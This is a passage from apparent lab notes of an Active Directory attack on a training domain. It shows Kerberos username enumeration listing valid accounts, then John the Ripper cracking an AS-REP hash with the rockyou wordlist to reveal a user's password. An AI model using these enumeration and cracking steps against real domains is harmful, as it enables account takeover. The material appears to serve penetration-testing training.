2026/09/28 06:23:05 >  [+] VALID USERNAME:       mshoemaker@INLANEFREIGHT.LOCAL
2026/09/28 06:23:05 >  [+] VALID USERNAME:       mholliday@INLANEFREIGHT.LOCAL
2026/09/28 06:23:05 >  [+] VALID USERNAME:       ngriffith@INLANEFREIGHT.LOCAL
2026/09/28 06:23:05 >  [+] VALID USERNAME:       sinman@INLANEFREIGHT.LOCAL
2026/09/28 06:23:05 >  [+] VALID USERNAME:       minman@INLANEFREIGHT.LOCAL
2026/09/28 06:23:05 >  [+] VALID USERNAME:       rhester@INLANEFREIGHT.LOCAL
2026/09/28 06:23:05 >  [+] VALID USERNAME:       rburrows@INLANEFREIGHT.LOCAL
2026/09/28 06:23:06 >  [+] VALID USERNAME:       dpalacios@INLANEFREIGHT.LOCAL
2026/09/28 06:23:07 >  [+] VALID USERNAME:       strent@INLANEFREIGHT.LOCAL
2026/09/28 06:23:07 >  [+] VALID USERNAME:       fanthony@INLANEFREIGHT.LOCAL
2026/09/28 06:23:07 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL
2026/09/28 06:23:08 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2026/09/28 06:23:08 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2026/09/28 06:23:09 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2026/09/28 06:23:09 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2026/09/28 06:23:10 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2026/09/28 06:23:11 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2026/09/28 06:23:12 >  Done! Tested 48705 usernames (56 valid) in 9.502 seconds
```

```jsx
┌──(kali㉿kali)-[~/Downloads]
└─$ nano hash.txt 
                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome!00       ($krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL)     
1g 0:00:00:06 DONE (2026-09-28 06:25) 0.1529g/s 1604Kp/s 1604Kc/s 1604KC/s Welcome456..Wassermelone1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                             
```